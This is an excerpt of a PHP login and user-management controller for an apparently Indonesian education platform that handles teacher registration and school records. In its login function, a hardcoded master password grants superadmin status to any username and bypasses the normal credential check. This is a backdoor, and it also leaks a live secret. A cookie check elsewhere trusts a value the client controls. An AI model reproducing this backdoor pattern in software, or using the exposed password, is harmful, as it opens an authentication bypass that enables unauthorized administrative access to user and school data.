...
//        die();
	...
	public function login()
	{
		...
		if ($password == 'J3n3ngku4nt0') {
			...
			$olehsuperadmin = true;
			$this->session->set_userdata('superadmin', 'aktif');

		} else {
			$row = $this->M_login->login($username, $password)->row();
			$this->session->set_userdata('superadmin', 'non');
		}
...
//			die();
	...
	{
		$cekkukimentor = get_cookie('mentor');
		if (substr($cekkukimentor,0,2)!='2-')
	...
	public function tambahuser()
	{
		...
		if ($jabatan == "Guru") {
			...
			if ($npsn!=null && $npsn!="")
			{
				...
				{
					$this->load->Model('M_login');
					$sekolahajuan=$this->M_login->ambildataajuansekolahcalver($npsn);
					$npsnbaru=$sekolahajuan->npsn;
					$namasekolahbaru=$sekolahajuan->sekolah;
					$kdkota=$sekolahajuan->kd_kota;
					$kdprovinsi=$sekolahajuan->kd_provinsi;

					$dataseks=[];
					$dataseks['npsn'] = $npsnbaru;
					$dataseks['nama_sekolah'] = $namasekolahbaru;
					$dataseks['idkota'] = $kdkota;

					$this->M_login->addchnsekolah($dataseks);
					$sekolahku = $this->M_channel->getSekolahKu($npsn);
				}
			...
			$data['referrer_calver'] = $this->input->post('referrer_calver');
			$data['sebagai'] = 1;
			$data['verifikator'] = 1;
			...
			if ($npsn!=null && $npsn!="")
			{
				...
				// if (!$sekolahku)
				// {
				// 	$cek$this->M_channel->getSekolahKu($npsn);
				// }
				$data['kd_kota'] = $sekolahku[0]->idkota;
				$data['sekolah'] = $sekolahku[0]->nama_sekolah;
				$kotaku = $this->M_channel->getNamaKota($sekolahku[0]->idkota);
...
//		$data['loginURL'] = $this->google->loginURL();
		...
		if ($this->session->userdata('loggedIn')) {
			...
			//$data['dafpropinsi'] = $this->M_login->dafpropinsi(1);
			$data['dafkelas'] = $this->M_login->dafjenjangkelas();
	...
	public function updateuser()
	{
		...
		$data['kelas_user'] = $this->input->post('ikelas');
...
//		$this->session->sess_destroy();
	...
	public function upgradeverifikator()
	{
		$iduser = $this->session->userdata("id_user");
		$npsn = $this->session->userdata("npsn");
		$cekstatus = $this->M_login->cekluluscalver($iduser, $npsn);
